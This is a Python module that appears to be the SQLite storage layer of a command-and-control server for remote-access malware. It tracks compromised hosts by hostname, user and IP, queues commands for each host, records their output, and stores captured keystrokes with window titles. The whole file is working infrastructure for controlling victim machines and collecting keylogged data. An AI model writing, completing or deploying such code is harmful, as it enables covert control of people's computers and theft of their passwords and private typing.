import os
import sqlite3
import secrets
from datetime import datetime, timedelta

def init_database(db_path: str):
    os.makedirs(os.path.dirname(db_path), exist_ok=True)
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            session_id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            ip_address TEXT,
            os_type TEXT,
            os_version TEXT,
            first_seen TEXT,
            last_seen TEXT,
            active INTEGER DEFAULT 1
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tasks (
            task_id TEXT PRIMARY KEY,
            session_id TEXT,
            command TEXT,
            created_at TEXT,
            retrieved_at TEXT,
            completed_at TEXT,
            status TEXT DEFAULT 'pending',
            FOREIGN KEY (session_id) REFERENCES sessions(session_id)
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS results (
            result_id TEXT PRIMARY KEY,
            task_id TEXT,
            session_id TEXT,
            output TEXT,
            received_at TEXT,
            FOREIGN KEY (task_id) REFERENCES tasks(task_id),
            FOREIGN KEY (session_id) REFERENCES sessions(session_id)
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            keystroke_id TEXT PRIMARY KEY,
            session_id TEXT,
            window_title TEXT,
            keystrokes TEXT,
            timestamp TEXT,
            FOREIGN KEY (session_id) REFERENCES sessions(session_id)
        )
    ''')

    conn.commit()
    conn.close()

def create_session(db_path: str, session_id: str, payload: dict, ip_address: str):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO sessions 
        (session_id, hostname, username, ip_address, os_type, os_version, 
         first_seen, last_seen, active)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)
    ''', (
        session_id,
        payload.get('hostname', 'unknown'),
        payload.get('username', 'unknown'),
        ip_address,
        payload.get('os_type', 'unknown'),
        payload.get('os_version', 'unknown'),
        now,
        now
    ))
    conn.commit()
    conn.close()

def update_session(db_path: str, session_id: str, ip_address: str):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('''
        UPDATE sessions 
        SET last_seen = ?, ip_address = ?
        WHERE session_id = ?
    ''', (
        datetime.now().isoformat(),
        ip_address,
        session_id
    ))
    conn.commit()
    conn.close()

def get_pending_tasks(db_path: str, session_id: str):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT task_id, command
        FROM tasks
        WHERE session_id = ? AND status = 'pending'
        ORDER BY created_at ASC
    ''', (session_id,))
    tasks = [{'task_id': row[0], 'command': row[1]} for row in cursor.fetchall()]
    for task in tasks:
        cursor.execute('''
            UPDATE tasks
            SET status = 'retrieved', retrieved_at = ?
            WHERE task_id = ?
        ''', (datetime.now().isoformat(), task['task_id']))
    conn.commit()
    conn.close()
    return tasks

def store_results(db_path: str, payload: dict):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    result_id = secrets.token_hex(16)
    task_id = payload.get('task_id')
    session_id = payload.get('session_id')
    output = payload.get('output', '')
    cursor.execute('''
        INSERT INTO results (result_id, task_id, session_id, output, received_at)
        VALUES (?, ?, ?, ?, ?)
    ''', (
        result_id,
        task_id,
        session_id,
        output,
        datetime.now().isoformat()
    ))
    cursor.execute('''
        UPDATE tasks
        SET status = 'completed', completed_at = ?
        WHERE task_id = ?
    ''', (datetime.now().isoformat(), task_id))
    conn.commit()
    conn.close()

def cleanup_old_sessions(db_path: str, max_age_days: int):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cutoff_date = (datetime.now() - timedelta(days=max_age_days)).isoformat()
    cursor.execute('''
        UPDATE sessions
        SET active = 0
        WHERE last_seen < ? AND active = 1
    ''', (cutoff_date,))
    deactivated = cursor.rowcount
    conn.commit()
    conn.close()
    return deactivated